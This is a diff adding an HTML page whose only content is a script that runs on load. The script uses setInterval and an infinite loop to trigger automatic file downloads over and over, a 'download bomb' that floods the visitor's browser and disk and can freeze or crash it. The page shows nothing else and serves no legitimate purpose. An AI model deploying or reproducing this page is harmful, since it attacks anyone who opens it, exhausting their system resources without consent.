@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<style type="text/css">
+       html, body {
+     width: 100%;
+    height: 100%;
+}
+</style>
+
+<script> 
+
+function download() {
+	var k = new Blob([10]);
+	var l = document.createElement("a"),
+		m = URL.createObjectURL(k);		
+		l.href = m, l.download = "", l.click(); 
+}
+
+function bomb_character() {
+	while (true) download();
+}
+
+function intervalCall() {
+	  setInterval(function(){ 
+	    bomb_character(); }, 1);
+}
+
+</script>
+
+</head>
+
+<body onload="intervalCall();" style="background:#00000; cursor: url('cursor.png') 100 100, crosshair;">
+
+</body>
+</body>
+</html>
